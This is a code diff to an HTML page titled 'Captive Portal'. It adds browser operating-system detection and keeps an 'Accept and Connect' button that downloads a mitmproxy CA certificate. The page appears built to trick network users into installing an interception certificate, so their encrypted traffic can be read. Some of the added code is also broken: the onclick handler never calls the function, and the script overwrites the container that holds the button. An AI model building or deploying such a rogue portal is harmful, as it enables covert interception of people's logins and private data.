@@ -4,7 +4,33 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Captive Portal</title>
-    <script scr = "listener.js"></script>
+    <script>
+        function detectOS() {
+            let userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            let os = "Unknown OS";
+
+            if (/windows phone/i.test(userAgent)) {
+                os = "Windows Phone";
+            } else if (/windows/i.test(userAgent)) {
+                os = "Windows";
+            } else if (/macintosh|mac os x/i.test(userAgent)) {
+                os = "MacOS";
+            } else if (/android/i.test(userAgent)) {
+                os = "Android";
+            } else if (/linux/i.test(userAgent)) {
+                os = "Linux";
+            } else if (/iphone|ipad|ipod/i.test(userAgent)) {
+                os = "iOS";
+            }
+
+            return os;
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const osName = detectOS();
+            document.getElementById("os-display").innerText = `Your Operating System: ${osName}`;
+        });
+    </script>
     <style>
 
         body {
@@ -70,7 +96,7 @@
 
 <body>
     <section>
-        <div>
+        <div id = "os-display">
             <section>
                 <p class="welctext">Welcome Patrons! </p>
             </section>
@@ -84,7 +110,7 @@
 
             <section>
                 <a href="mitmproxy-ca-cert.pem" download="">
-                    <button onload = "detectOS()">  
+                    <button onclick = "detectOS">  
                         Accept and Connect
                     </button>
                 </a>
